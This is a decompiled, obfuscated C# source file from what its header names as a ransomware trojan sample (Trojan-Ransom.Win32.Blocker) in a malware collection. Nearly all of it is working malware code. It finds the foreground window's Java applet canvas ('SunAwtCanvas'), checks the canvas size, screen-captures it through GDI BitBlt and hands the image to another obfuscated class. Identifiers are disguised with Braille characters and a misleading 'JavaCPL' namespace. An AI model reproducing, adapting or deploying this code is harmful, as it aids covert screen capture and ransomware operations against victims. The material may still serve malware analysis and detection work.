// Decompiled with JetBrains decompiler
// Type: JavaCPL.⡆⢃⢂⡥⢩⠊⠐⢝⠺⠃⢍⢥⠟⠀⢣⡌⣔⠡⣆⠀⠤⡕⡗⢢⢉⡺⡳⢅⢉⢭⡩⠞⢻⣝⢫⢷⢫⣅⢟⡩⡸⡠
// Assembly: .2.0, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D728DFE8-0424-42D7-ACC0-907783455C02
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\Trojan-Ransom.Win32.Blocker.ibct-b02e1fcc2ef9de8dc5b061667d8124e703544516922dd8f6779b2614a9a27bc6.exe

using System;
using System.Collections.Generic;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Text;

namespace JavaCPL
{
  public static class \u2846\u2883\u2882\u2865\u28A9\u280A\u2810\u289D\u283A\u2803\u288D\u28A5\u281F\u2800\u28A3\u284C\u28D4\u2821\u28C6\u2800\u2824\u2855\u2857\u28A2\u2889\u287A\u2873\u2885\u2889\u28AD\u2869\u281E\u28BB\u28DD\u28AB\u28B7\u28AB\u28C5\u289F\u2869\u2878\u2860
  {
    public static IntPtr \u28C8\u288B\u28BE\u288F\u2800\u286C\u28CA\u2816\u2877\u2834\u2813\u2846\u28D0\u282C\u28BF\u28BB\u282F\u2876\u286B\u2814\u286C\u287A\u286F\u28C9\u2822\u2835\u28CB\u2880\u280F\u2862\u285C\u2868\u28A3\u2803\u286E\u2816\u28AA\u28CA() => \u2846\u2883\u2882\u2865\u28A9\u280A\u2810\u289D\u283A\u2803\u288D\u28A5\u281F\u2800\u28A3\u284C\u28D4\u2821\u28C6\u2800\u2824\u2855\u2857\u28A2\u2889\u287A\u2873\u2885\u2889\u28AD\u2869\u281E\u28BB\u28DD\u28AB\u28B7\u28AB\u28C5\u289F\u2869\u2878\u2860.User32.GetForegroundWindow();

    public static bool \u2819\u289F\u2897\u28D1\u28C9\u28A8\u2897\u28BA\u288B\u28CB\u2809\u286F\u28D3\u280C\u284C\u28C5\u284E\u281C\u28D5\u286D\u28AA\u2880\u2849\u2807\u2815\u28B8\u288A\u2882\u28CD\u289D\u28A8\u2810\u2845\u2803\u2852\u2855\u28B5\u2888\u2885\u2821\u286B\u285B\u2840\u2894(
      IntPtr _param0,
      IntPtr _param1)
    {
      if (!(GCHandle.FromIntPtr(_param1).Target is List<IntPtr> target))
        throw new InvalidCastException("GCHandle Target could not be cast as List<IntPtr>");
      target.Add(_param0);
      return true;
    }

    public static IntPtr[] \u28D5\u285A\u28B4\u286C\u28AA\u28A2\u2821\u284B\u2839\u286D\u28BF\u2880\u283F\u2878\u2812\u28B1\u2814\u286C\u284F\u2802\u281D\u284F\u2865\u28C3\u28C0\u2869\u2822\u2862\u2861(
      IntPtr _param0)
    {
      List<IntPtr> numList = new List<IntPtr>();
      GCHandle gcHandle = GCHandle.Alloc((object) numList);
      try
      {
        \u2846\u2883\u2882\u2865\u28A9\u280A\u2810\u289D\u283A\u2803\u288D\u28A5\u281F\u2800\u28A3\u284C\u28D4\u2821\u28C6\u2800\u2824\u2855\u2857\u28A2\u2889\u287A\u2873\u2885\u2889\u28AD\u2869\u281E\u28BB\u28DD\u28AB\u28B7\u28AB\u28C5\u289F\u2869\u2878\u2860.EnumWindowsProc lpEnumFunc = new \u2846\u2883\u2882\u2865\u28A9\u280A\u2810\u289D\u283A\u2803\u288D\u28A5\u281F\u2800\u28A3\u284C\u28D4\u2821\u28C6\u2800\u2824\u2855\u2857\u28A2\u2889\u287A\u2873\u2885\u2889\u28AD\u2869\u281E\u28BB\u28DD\u28AB\u28B7\u28AB\u28C5\u289F\u2869\u2878\u2860.EnumWindowsProc(\u2846\u2883\u2882\u2865\u28A9\u280A\u2810\u289D\u283A\u2803\u288D\u28A5\u281F\u2800\u28A3\u284C\u28D4\u2821\u28C6\u2800\u2824\u2855\u2857\u28A2\u2889\u287A\u2873\u2885\u2889\u28AD\u2869\u281E\u28BB\u28DD\u28AB\u28B7\u28AB\u28C5\u289F\u2869\u2878\u2860.\u2819\u289F\u2897\u28D1\u28C9\u28A8\u2897\u28BA\u288B\u28CB\u2809\u286F\u28D3\u280C\u284C\u28C5\u284E\u281C\u28D5\u286D\u28AA\u2880\u2849\u2807\u2815\u28B8\u288A\u2882\u28CD\u289D\u28A8\u2810\u2845\u2803\u2852\u2855\u28B5\u2888\u2885\u2821\u286B\u285B\u2840\u2894);
        \u2846\u2883\u2882\u2865\u28A9\u280A\u2810\u289D\u283A\u2803\u288D\u28A5\u281F\u2800\u28A3\u284C\u28D4\u2821\u28C6\u2800\u2824\u2855\u2857\u28A2\u2889\u287A\u2873\u2885\u2889\u28AD\u2869\u281E\u28BB\u28DD\u28AB\u28B7\u28AB\u28C5\u289F\u2869\u2878\u2860.User32.EnumChildWindows(_param0, lpEnumFunc, GCHandle.ToIntPtr(gcHandle));
      }
      finally
      {
        if (gcHandle.IsAllocated)
          gcHandle.Free();
      }
      return numList.ToArray();
    }

    public static string \u2807\u289D\u2847\u2833\u28A2\u28C0\u28B3\u28C3\u2892\u284C\u28D4\u28B3\u2815\u28CB\u2891\u280D\u287F\u28B1\u28B0\u287B\u2830\u2877\u2890\u2806\u2861\u2877\u2811\u284A\u28DE\u28B5\u28BE\u28BC\u286F\u281E\u285D\u2816\u286E\u280D\u28D4\u2871\u2813\u284D\u2808\u28B2\u287D\u2817\u28D0\u289B\u2843\u28C2\u280D\u286F\u28AF\u2823\u2899\u286F\u280D\u2840\u28B2\u282B(
      IntPtr _param0)
    {
      StringBuilder pszType = new StringBuilder();
      int windowClass = (int) \u2846\u2883\u2882\u2865\u28A9\u280A\u2810\u289D\u283A\u2803\u288D\u28A5\u281F\u2800\u28A3\u284C\u28D4\u2821\u28C6\u2800\u2824\u2855\u2857\u28A2\u2889\u287A\u2873\u2885\u2889\u28AD\u2869\u281E\u28BB\u28DD\u28AB\u28B7\u28AB\u28C5\u289F\u2869\u2878\u2860.User32.RealGetWindowClass(_param0, pszType, (uint) byte.MaxValue);
      return pszType.ToString();
    }

    public static string \u28A9\u2814\u281E\u280B\u28D7\u2872\u2880\u2870\u2851\u2837\u2812\u287C\u28BE\u285A\u2844\u2878\u2804\u2875\u288D\u2829\u283D\u28B7\u282D\u289B\u287C\u2891\u288D\u28CC\u28BA\u2857\u28B1\u2825\u2849\u2828\u289E\u2816\u2826\u2859\u28BC\u2866(
      IntPtr _param0)
    {
      bool flag = false;
      StringBuilder text = new StringBuilder((int) byte.MaxValue);
      while (flag)
      {
        try
        {
          \u2846\u2883\u2882\u2865\u28A9\u280A\u2810\u289D\u283A\u2803\u288D\u28A5\u281F\u2800\u28A3\u284C\u28D4\u2821\u28C6\u2800\u2824\u2855\u2857\u28A2\u2889\u287A\u2873\u2885\u2889\u28AD\u2869\u281E\u28BB\u28DD\u28AB\u28B7\u28AB\u28C5\u289F\u2869\u2878\u2860.User32.GetWindowText(_param0, text, text.Capacity);
        }
        catch (Exception ex)
        {
          flag = true;
        }
      }
      return text.ToString();
    }

    public static IntPtr \u282F\u28A2\u28CB\u2875\u2881\u28D8\u2882\u28D7\u28BD\u2894\u28A0\u2825\u289F\u286E\u2844\u2828\u283B\u28AF\u2891\u281E\u280C\u28DC\u2849\u28C5\u2871\u2893\u2863\u2873\u2856\u2888\u289C\u2818\u2892\u28D0\u28DD\u288F\u289F\u2823\u2885\u2885\u2863\u28CD\u280C\u2866\u28C8\u288F\u2872\u28A1\u28BE\u285B\u2882\u2860\u2868\u28C5()
    {
      IntPtr hwnd = \u2846\u2883\u2882\u2865\u28A9\u280A\u2810\u289D\u283A\u2803\u288D\u28A5\u281F\u2800\u28A3\u284C\u28D4\u2821\u28C6\u2800\u2824\u2855\u2857\u28A2\u2889\u287A\u2873\u2885\u2889\u28AD\u2869\u281E\u28BB\u28DD\u28AB\u28B7\u28AB\u28C5\u289F\u2869\u2878\u2860.\u2832\u2859\u2805\u2804\u28CE\u2874\u280E\u2881\u2835\u28D7\u2887\u2873\u28AF\u2870\u2894\u2869\u2817\u2829\u280C\u289B\u281E\u28D0\u28C3\u28DD\u28C1\u2820\u28A1\u2894\u28DA\u2806\u283B\u2890\u28AC\u282F\u28AB\u2836\u289A\u281E\u2896\u2810\u2854\u284C\u28B7\u286E\u2841\u281C\u28A3\u2830\u282A\u28D2\u286A\u2837(\u2846\u2883\u2882\u2865\u28A9\u280A\u2810\u289D\u283A\u2803\u288D\u28A5\u281F\u2800\u28A3\u284C\u28D4\u2821\u28C6\u2800\u2824\u2855\u2857\u28A2\u2889\u287A\u2873\u2885\u2889\u28AD\u2869\u281E\u28BB\u28DD\u28AB\u28B7\u28AB\u28C5\u289F\u2869\u2878\u2860.\u28D5\u285A\u28B4\u286C\u28AA\u28A2\u2821\u284B\u2839\u286D\u28BF\u2880\u283F\u2878\u2812\u28B1\u2814\u286C\u284F\u2802\u281D\u284F\u2865\u28C3\u28C0\u2869\u2822\u2862\u2861(\u2846\u2883\u2882\u2865\u28A9\u280A\u2810\u289D\u283A\u2803\u288D\u28A5\u281F\u2800\u28A3\u284C\u28D4\u2821\u28C6\u2800\u2824\u2855\u2857\u28A2\u2889\u287A\u2873\u2885\u2889\u28AD\u2869\u281E\u28BB\u28DD\u28AB\u28B7\u28AB\u28C5\u289F\u2869\u2878\u2860.\u28C8\u288B\u28BE\u288F\u2800\u286C\u28CA\u2816\u2877\u2834\u2813\u2846\u28D0\u282C\u28BF\u28BB\u282F\u2876\u286B\u2814\u286C\u287A\u286F\u28C9\u2822\u2835\u28CB\u2880\u280F\u2862\u285C\u2868\u28A3\u2803\u286E\u2816\u28AA\u28CA()), "SunAwtCanvas");
      \u2846\u2883\u2882\u2865\u28A9\u280A\u2810\u289D\u283A\u2803\u288D\u28A5\u281F\u2800\u28A3\u284C\u28D4\u2821\u28C6\u2800\u2824\u2855\u2857\u28A2\u2889\u287A\u2873\u2885\u2889\u28AD\u2869\u281E\u28BB\u28DD\u28AB\u28B7\u28AB\u28C5\u289F\u2869\u2878\u2860.RECT lpRect;
      \u2846\u2883\u2882\u2865\u28A9\u280A\u2810\u289D\u283A\u2803\u288D\u28A5\u281F\u2800\u28A3\u284C\u28D4\u2821\u28C6\u2800\u2824\u2855\u2857\u28A2\u2889\u287A\u2873\u2885\u2889\u28AD\u2869\u281E\u28BB\u28DD\u28AB\u28B7\u28AB\u28C5\u289F\u2869\u2878\u2860.User32.GetWindowRect(hwnd, out lpRect);
      int num1 = lpRect.right - lpRect.left;
      int num2 = lpRect.bottom - lpRect.top;
      return num1 > 700 && num2 > 500 ? hwnd : IntPtr.Zero;
    }

    public static IntPtr \u2832\u2859\u2805\u2804\u28CE\u2874\u280E\u2881\u2835\u28D7\u2887\u2873\u28AF\u2870\u2894\u2869\u2817\u2829\u280C\u289B\u281E\u28D0\u28C3\u28DD\u28C1\u2820\u28A1\u2894\u28DA\u2806\u283B\u2890\u28AC\u282F\u28AB\u2836\u289A\u281E\u2896\u2810\u2854\u284C\u28B7\u286E\u2841\u281C\u28A3\u2830\u282A\u28D2\u286A\u2837(
      IntPtr[] _param0,
      string _param1)
    {
      IntPtr zero = IntPtr.Zero;
      IntPtr num1 = IntPtr.Zero;
      foreach (IntPtr num2 in _param0)
      {
        if (num2 != IntPtr.Zero && \u2846\u2883\u2882\u2865\u28A9\u280A\u2810\u289D\u283A\u2803\u288D\u28A5\u281F\u2800\u28A3\u284C\u28D4\u2821\u28C6\u2800\u2824\u2855\u2857\u28A2\u2889\u287A\u2873\u2885\u2889\u28AD\u2869\u281E\u28BB\u28DD\u28AB\u28B7\u28AB\u28C5\u289F\u2869\u2878\u2860.\u2807\u289D\u2847\u2833\u28A2\u28C0\u28B3\u28C3\u2892\u284C\u28D4\u28B3\u2815\u28CB\u2891\u280D\u287F\u28B1\u28B0\u287B\u2830\u2877\u2890\u2806\u2861\u2877\u2811\u284A\u28DE\u28B5\u28BE\u28BC\u286F\u281E\u285D\u2816\u286E\u280D\u28D4\u2871\u2813\u284D\u2808\u28B2\u287D\u2817\u28D0\u289B\u2843\u28C2\u280D\u286F\u28AF\u2823\u2899\u286F\u280D\u2840\u28B2\u282B(num2).Contains(_param1))
        {
          for (IntPtr index = new IntPtr(\u2846\u2883\u2882\u2865\u28A9\u280A\u2810\u289D\u283A\u2803\u288D\u28A5\u281F\u2800\u28A3\u284C\u28D4\u2821\u28C6\u2800\u2824\u2855\u2857\u28A2\u2889\u287A\u2873\u2885\u2889\u28AD\u2869\u281E\u28BB\u28DD\u28AB\u28B7\u28AB\u28C5\u289F\u2869\u2878\u2860.User32.GetWindow(num2.ToInt32(), \u2846\u2883\u2882\u2865\u28A9\u280A\u2810\u289D\u283A\u2803\u288D\u28A5\u281F\u2800\u28A3\u284C\u28D4\u2821\u28C6\u2800\u2824\u2855\u2857\u28A2\u2889\u287A\u2873\u2885\u2889\u28AD\u2869\u281E\u28BB\u28DD\u28AB\u28B7\u28AB\u28C5\u289F\u2869\u2878\u2860.GW.CHILD)); index != IntPtr.Zero; index = new IntPtr(\u2846\u2883\u2882\u2865\u28A9\u280A\u2810\u289D\u283A\u2803\u288D\u28A5\u281F\u2800\u28A3\u284C\u28D4\u2821\u28C6\u2800\u2824\u2855\u2857\u28A2\u2889\u287A\u2873\u2885\u2889\u28AD\u2869\u281E\u28BB\u28DD\u28AB\u28B7\u28AB\u28C5\u289F\u2869\u2878\u2860.User32.GetWindow(num1.ToInt32(), \u2846\u2883\u2882\u2865\u28A9\u280A\u2810\u289D\u283A\u2803\u288D\u28A5\u281F\u2800\u28A3\u284C\u28D4\u2821\u28C6\u2800\u2824\u2855\u2857\u28A2\u2889\u287A\u2873\u2885\u2889\u28AD\u2869\u281E\u28BB\u28DD\u28AB\u28B7\u28AB\u28C5\u289F\u2869\u2878\u2860.GW.CHILD)))
            num1 = index;
          \u2846\u2883\u2882\u2865\u28A9\u280A\u2810\u289D\u283A\u2803\u288D\u28A5\u281F\u2800\u28A3\u284C\u28D4\u2821\u28C6\u2800\u2824\u2855\u2857\u28A2\u2889\u287A\u2873\u2885\u2889\u28AD\u2869\u281E\u28BB\u28DD\u28AB\u28B7\u28AB\u28C5\u289F\u2869\u2878\u2860.\u2807\u289D\u2847\u2833\u28A2\u28C0\u28B3\u28C3\u2892\u284C\u28D4\u28B3\u2815\u28CB\u2891\u280D\u287F\u28B1\u28B0\u287B\u2830\u2877\u2890\u2806\u2861\u2877\u2811\u284A\u28DE\u28B5\u28BE\u28BC\u286F\u281E\u285D\u2816\u286E\u280D\u28D4\u2871\u2813\u284D\u2808\u28B2\u287D\u2817\u28D0\u289B\u2843\u28C2\u280D\u286F\u28AF\u2823\u2899\u286F\u280D\u2840\u28B2\u282B(num1);
          if (\u2846\u2883\u2882\u2865\u28A9\u280A\u2810\u289D\u283A\u2803\u288D\u28A5\u281F\u2800\u28A3\u284C\u28D4\u2821\u28C6\u2800\u2824\u2855\u2857\u28A2\u2889\u287A\u2873\u2885\u2889\u28AD\u2869\u281E\u28BB\u28DD\u28AB\u28B7\u28AB\u28C5\u289F\u2869\u2878\u2860.\u2807\u28B8\u288E\u28BE\u2875\u2827\u2814\u282A\u2819\u2888\u28DF\u284C\u286C\u285F\u289F\u28B9\u2869\u284B\u28A6\u2897\u28AF\u281C\u2831\u28D3\u282F\u2813\u2806\u28DC(num1))
            return num1;
        }
      }
      return IntPtr.Zero;
    }

    public static bool \u282D\u2810\u2806\u2874\u2819\u28A0\u2875\u28A3\u2897\u287F\u28D9\u2810\u2818\u283B\u2831\u289B\u2889\u2855\u28CE\u2863\u2815\u28DC\u281C\u28B7\u2860\u2813\u28A3\u2841\u28C8\u287B\u2864\u28AB() => \u2846\u2883\u2882\u2865\u28A9\u280A\u2810\u289D\u283A\u2803\u288D\u28A5\u281F\u2800\u28A3\u284C\u28D4\u2821\u28C6\u2800\u2824\u2855\u2857\u28A2\u2889\u287A\u2873\u2885\u2889\u28AD\u2869\u281E\u28BB\u28DD\u28AB\u28B7\u28AB\u28C5\u289F\u2869\u2878\u2860.\u282F\u28A2\u28CB\u2875\u2881\u28D8\u2882\u28D7\u28BD\u2894\u28A0\u2825\u289F\u286E\u2844\u2828\u283B\u28AF\u2891\u281E\u280C\u28DC\u2849\u28C5\u2871\u2893\u2863\u2873\u2856\u2888\u289C\u2818\u2892\u28D0\u28DD\u288F\u289F\u2823\u2885\u2885\u2863\u28CD\u280C\u2866\u28C8\u288F\u2872\u28A1\u28BE\u285B\u2882\u2860\u2868\u28C5() != IntPtr.Zero;

    public static bool \u2807\u28B8\u288E\u28BE\u2875\u2827\u2814\u282A\u2819\u2888\u28DF\u284C\u286C\u285F\u289F\u28B9\u2869\u284B\u28A6\u2897\u28AF\u281C\u2831\u28D3\u282F\u2813\u2806\u28DC(
      IntPtr _param0)
    {
      \u2846\u2883\u2882\u2865\u28A9\u280A\u2810\u289D\u283A\u2803\u288D\u28A5\u281F\u2800\u28A3\u284C\u28D4\u2821\u28C6\u2800\u2824\u2855\u2857\u28A2\u2889\u287A\u2873\u2885\u2889\u28AD\u2869\u281E\u28BB\u28DD\u28AB\u28B7\u28AB\u28C5\u289F\u2869\u2878\u2860.RECT lpRect;
      \u2846\u2883\u2882\u2865\u28A9\u280A\u2810\u289D\u283A\u2803\u288D\u28A5\u281F\u2800\u28A3\u284C\u28D4\u2821\u28C6\u2800\u2824\u2855\u2857\u28A2\u2889\u287A\u2873\u2885\u2889\u28AD\u2869\u281E\u28BB\u28DD\u28AB\u28B7\u28AB\u28C5\u289F\u2869\u2878\u2860.User32.GetWindowRect(_param0, out lpRect);
      return lpRect.bottom - lpRect.top > 400;
    }

    public static Bitmap \u28D7\u283F\u286D\u28C4\u281E\u2877\u284E\u283B\u2836\u288C\u2837\u2877\u28BC\u2877\u2821\u28BD\u28B6\u28A4\u281F\u2852\u28D7\u28AB\u285B\u28CB\u285C\u2819\u2888(
      Bitmap _param0,
      Rectangle _param1)
    {
      bool flag = false;
      Bitmap bitmap = new Bitmap(_param1.Width, _param1.Height);
      while (flag)
      {
        try
        {
          Graphics graphics = Graphics.FromImage((Image) bitmap);
          graphics.DrawImage((Image) _param0, 0, 0, _param1, GraphicsUnit.Pixel);
          graphics.Dispose();
        }
        catch (Exception ex)
        {
          flag = true;
        }
      }
      return bitmap;
    }

    public static Bitmap \u287E\u2842\u28B3\u2845\u2871\u287E\u28A2\u28D0\u2891\u283B\u288E\u2832\u2823\u281A\u28A9\u284D\u2849\u281A\u2835\u282D\u2875\u2821\u288E\u2892\u28AE\u2812\u2835\u28CE(
      out Point _param0)
    {
      try
      {
        IntPtr hwnd = \u2846\u2883\u2882\u2865\u28A9\u280A\u2810\u289D\u283A\u2803\u288D\u28A5\u281F\u2800\u28A3\u284C\u28D4\u2821\u28C6\u2800\u2824\u2855\u2857\u28A2\u2889\u287A\u2873\u2885\u2889\u28AD\u2869\u281E\u28BB\u28DD\u28AB\u28B7\u28AB\u28C5\u289F\u2869\u2878\u2860.\u282F\u28A2\u28CB\u2875\u2881\u28D8\u2882\u28D7\u28BD\u2894\u28A0\u2825\u289F\u286E\u2844\u2828\u283B\u28AF\u2891\u281E\u280C\u28DC\u2849\u28C5\u2871\u2893\u2863\u2873\u2856\u2888\u289C\u2818\u2892\u28D0\u28DD\u288F\u289F\u2823\u2885\u2885\u2863\u28CD\u280C\u2866\u28C8\u288F\u2872\u28A1\u28BE\u285B\u2882\u2860\u2868\u28C5();
        \u2846\u2883\u2882\u2865\u28A9\u280A\u2810\u289D\u283A\u2803\u288D\u28A5\u281F\u2800\u28A3\u284C\u28D4\u2821\u28C6\u2800\u2824\u2855\u2857\u28A2\u2889\u287A\u2873\u2885\u2889\u28AD\u2869\u281E\u28BB\u28DD\u28AB\u28B7\u28AB\u28C5\u289F\u2869\u2878\u2860.RECT lpRect;
        \u2846\u2883\u2882\u2865\u28A9\u280A\u2810\u289D\u283A\u2803\u288D\u28A5\u281F\u2800\u28A3\u284C\u28D4\u2821\u28C6\u2800\u2824\u2855\u2857\u28A2\u2889\u287A\u2873\u2885\u2889\u28AD\u2869\u281E\u28BB\u28DD\u28AB\u28B7\u28AB\u28C5\u289F\u2869\u2878\u2860.User32.GetWindowRect(hwnd, out lpRect);
        _param0 = new Point(lpRect.left, lpRect.top);
        int nWidth = lpRect.right - lpRect.left;
        int nHeight = lpRect.bottom - lpRect.top;
        int windowDc = \u2846\u2883\u2882\u2865\u28A9\u280A\u2810\u289D\u283A\u2803\u288D\u28A5\u281F\u2800\u28A3\u284C\u28D4\u2821\u28C6\u2800\u2824\u2855\u2857\u28A2\u2889\u287A\u2873\u2885\u2889\u28AD\u2869\u281E\u28BB\u28DD\u28AB\u28B7\u28AB\u28C5\u289F\u2869\u2878\u2860.User32.GetWindowDC(hwnd.ToInt32());
        int compatibleDc = \u2846\u2883\u2882\u2865\u28A9\u280A\u2810\u289D\u283A\u2803\u288D\u28A5\u281F\u2800\u28A3\u284C\u28D4\u2821\u28C6\u2800\u2824\u2855\u2857\u28A2\u2889\u287A\u2873\u2885\u2889\u28AD\u2869\u281E\u28BB\u28DD\u28AB\u28B7\u28AB\u28C5\u289F\u2869\u2878\u2860.GDI32.CreateCompatibleDC(windowDc);
        int compatibleBitmap = \u2846\u2883\u2882\u2865\u28A9\u280A\u2810\u289D\u283A\u2803\u288D\u28A5\u281F\u2800\u28A3\u284C\u28D4\u2821\u28C6\u2800\u2824\u2855\u2857\u28A2\u2889\u287A\u2873\u2885\u2889\u28AD\u2869\u281E\u28BB\u28DD\u28AB\u28B7\u28AB\u28C5\u289F\u2869\u2878\u2860.GDI32.CreateCompatibleBitmap(windowDc, nWidth, nHeight);
        \u2846\u2883\u2882\u2865\u28A9\u280A\u2810\u289D\u283A\u2803\u288D\u28A5\u281F\u2800\u28A3\u284C\u28D4\u2821\u28C6\u2800\u2824\u2855\u2857\u28A2\u2889\u287A\u2873\u2885\u2889\u28AD\u2869\u281E\u28BB\u28DD\u28AB\u28B7\u28AB\u28C5\u289F\u2869\u2878\u2860.GDI32.SelectObject(compatibleDc, compatibleBitmap);
        \u2846\u2883\u2882\u2865\u28A9\u280A\u2810\u289D\u283A\u2803\u288D\u28A5\u281F\u2800\u28A3\u284C\u28D4\u2821\u28C6\u2800\u2824\u2855\u2857\u28A2\u2889\u287A\u2873\u2885\u2889\u28AD\u2869\u281E\u28BB\u28DD\u28AB\u28B7\u28AB\u28C5\u289F\u2869\u2878\u2860.GDI32.BitBlt(compatibleDc, 0, 0, nWidth, nHeight, windowDc, 0, 0, 13369376);
        Bitmap bitmap = new Bitmap((Image) Image.FromHbitmap(new IntPtr(compatibleBitmap)), Image.FromHbitmap(new IntPtr(compatibleBitmap)).Width, Image.FromHbitmap(new IntPtr(compatibleBitmap)).Height);
        \u2846\u2883\u2882\u2865\u28A9\u280A\u2810\u289D\u283A\u2803\u288D\u28A5\u281F\u2800\u28A3\u284C\u28D4\u2821\u28C6\u2800\u2824\u2855\u2857\u28A2\u2889\u287A\u2873\u2885\u2889\u28AD\u2869\u281E\u28BB\u28DD\u28AB\u28B7\u28AB\u28C5\u289F\u2869\u2878\u2860.\u28B9\u2867\u281E\u2828\u2851\u2867\u28A6\u2888\u2868\u2874\u2887\u28C4\u28A3\u286E\u28A7\u28CE\u28D0\u28D0\u289A\u28BB\u28A5\u289F\u2882\u2824\u2844\u2870\u2867\u283A(compatibleBitmap, windowDc, hwnd, compatibleDc);
        new \u2842\u288E\u285F\u2895\u2822\u2802\u2875\u289C\u2832\u280E\u2897\u286C\u28C7\u288E\u289E\u2813\u2885\u2895\u289F\u285C\u289C\u2808\u2867\u28BE\u28B6\u28AD\u28A9\u2858\u28AE\u289A\u2854\u2845\u2896\u28B0\u2853\u2865\u28A2\u2874\u2819\u2811\u2816\u2889\u2870\u2837(bitmap).\u286C\u2838\u28B0\u2872\u2858\u289A\u289B\u288B\u28C1\u2839\u284B\u28AD\u28A3\u283F\u288A\u288A\u2873\u28B3\u28DE\u28AA\u28A9\u2810\u2869\u28A7\u28A4\u285B\u2864\u285D\u2850\u284A\u28CC\u28BB\u2889\u285F\u2848\u280D\u2866\u288A\u2881\u28BE\u2877\u287A\u28DA\u28AB\u283C\u281F\u285A\u2876\u28D4\u285B\u289E\u2846\u28C9\u28B9\u281C\u285C\u28AF\u2808\u28AE();
        return bitmap;
      }
      catch (Exception ex)
      {
        _param0 = new Point();
        return (Bitmap) null;
      }
    }

    public static void \u28B9\u2867\u281E\u2828\u2851\u2867\u28A6\u2888\u2868\u2874\u2887\u28C4\u28A3\u286E\u28A7\u28CE\u28D0\u28D0\u289A\u28BB\u28A5\u289F\u2882\u2824\u2844\u2870\u2867\u283A(
      int _param0,
      int _param1,
      IntPtr _param2,
      int _param3)
    {
      \u2846\u2883\u2882\u2865\u28A9\u280A\u2810\u289D\u283A\u2803\u288D\u28A5\u281F\u2800\u28A3\u284C\u28D4\u2821\u28C6\u2800\u2824\u2855\u2857\u28A2\u2889\u287A\u2873\u2885\u2889\u28AD\u2869\u281E\u28BB\u28DD\u28AB\u28B7\u28AB\u28C5\u289F\u2869\u2878\u2860.User32.ReleaseDC(_param2.ToInt32(), _param1);
      \u2846\u2883\u2882\u2865\u28A9\u280A\u2810\u289D\u283A\u2803\u288D\u28A5\u281F\u2800\u28A3\u284C\u28D4\u2821\u28C6\u2800\u2824\u2855\u2857\u28A2\u2889\u287A\u2873\u2885\u2889\u28AD\u2869\u281E\u28BB\u28DD\u28AB\u28B7\u28AB\u28C5\u289F\u2869\u2878\u2860.GDI32.DeleteDC(_param3);
      \u2846\u2883\u2882\u2865\u28A9\u280A\u2810\u289D\u283A\u2803\u288D\u28A5\u281F\u2800\u28A3\u284C\u28D4\u2821\u28C6\u2800\u2824\u2855\u2857\u28A2\u2889\u287A\u2873\u2885\u2889\u28AD\u2869\u281E\u28BB\u28DD\u28AB\u28B7\u28AB\u28C5\u289F\u2869\u2878\u2860.GDI32.DeleteObject(_param0);
    }

    internal delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);

    internal delegate bool EnumWindowProc(IntPtr hWnd, IntPtr parameter);

    private class GDI32
    {
      [DllImport("GDI32.dll")]
      public static extern bool BitBlt(
        int hdcDest,
        int nXDest,
        int nYDest,
        int nWidth,
        int nHeight,
        int hdcSrc,
        int nXSrc,
        int nYSrc,
        int dwRop);

      [DllImport("GDI32.dll")]
      public static extern int CreateCompatibleBitmap(int hdc, int nWidth, int nHeight);

      [DllImport("GDI32.dll")]
      public static extern int CreateCompatibleDC(int hdc);

      [DllImport("GDI32.dll")]
      public static extern bool DeleteDC(int hdc);

      [DllImport("GDI32.dll")]
      public static extern bool DeleteObject(int hObject);

      [DllImport("GDI32.dll")]
      public static extern int GetDeviceCaps(int hdc, int nIndex);

      [DllImport("GDI32.dll")]
      public static extern int SelectObject(int hdc, int hgdiobj);
    }

    private class User32
    {
      [DllImport("User32.dll")]
      public static extern IntPtr GetForegroundWindow();

      [DllImport("User32.dll")]
      public static extern int GetWindowDC(int hWnd);

      [DllImport("User32.dll")]
      public static extern int ReleaseDC(int hWnd, int hDC);

      [DllImport("user32.dll")]
      public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

      [DllImport("user32.dll")]
      public static extern int GetWindow(
        int hWnd,
        \u2846\u2883\u2882\u2865\u28A9\u280A\u2810\u289D\u283A\u2803\u288D\u28A5\u281F\u2800\u28A3\u284C\u28D4\u2821\u28C6\u2800\u2824\u2855\u2857\u28A2\u2889\u287A\u2873\u2885\u2889\u28AD\u2869\u281E\u28BB\u28DD\u28AB\u28B7\u28AB\u28C5\u289F\u2869\u2878\u2860.GW uCmd);

      [DllImport("user32.dll")]
      [return: MarshalAs(UnmanagedType.Bool)]
      public static extern bool EnumChildWindows(
        IntPtr hwndParent,
        \u2846\u2883\u2882\u2865\u28A9\u280A\u2810\u289D\u283A\u2803\u288D\u28A5\u281F\u2800\u28A3\u284C\u28D4\u2821\u28C6\u2800\u2824\u2855\u2857\u28A2\u2889\u287A\u2873\u2885\u2889\u28AD\u2869\u281E\u28BB\u28DD\u28AB\u28B7\u28AB\u28C5\u289F\u2869\u2878\u2860.EnumWindowsProc lpEnumFunc,
        IntPtr lParam);

      [DllImport("user32.dll")]
      [return: MarshalAs(UnmanagedType.Bool)]
      public static extern bool EnumWindows(
        \u2846\u2883\u2882\u2865\u28A9\u280A\u2810\u289D\u283A\u2803\u288D\u28A5\u281F\u2800\u28A3\u284C\u28D4\u2821\u28C6\u2800\u2824\u2855\u2857\u28A2\u2889\u287A\u2873\u2885\u2889\u28AD\u2869\u281E\u28BB\u28DD\u28AB\u28B7\u28AB\u28C5\u289F\u2869\u2878\u2860.EnumWindowsProc lpEnumFunc,
        IntPtr lParam);

      [DllImport("user32.dll")]
      public static extern uint RealGetWindowClass(
        IntPtr hwnd,
        [Out] StringBuilder pszType,
        uint cchType);

      [DllImport("user32.dll")]
      [return: MarshalAs(UnmanagedType.Bool)]
      public static extern bool GetWindowRect(
        IntPtr hwnd,
        out \u2846\u2883\u2882\u2865\u28A9\u280A\u2810\u289D\u283A\u2803\u288D\u28A5\u281F\u2800\u28A3\u284C\u28D4\u2821\u28C6\u2800\u2824\u2855\u2857\u28A2\u2889\u287A\u2873\u2885\u2889\u28AD\u2869\u281E\u28BB\u28DD\u28AB\u28B7\u28AB\u28C5\u289F\u2869\u2878\u2860.RECT lpRect);
    }

    public enum GW
    {
      HWNDFIRST,
      HWNDLAST,
      HWNDNEXT,
      HWNDPREV,
      OWNER,
      CHILD,
    }

    public struct RECT
    {
      public int left;
      public int top;
      public int right;
      public int bottom;
    }
  }
}
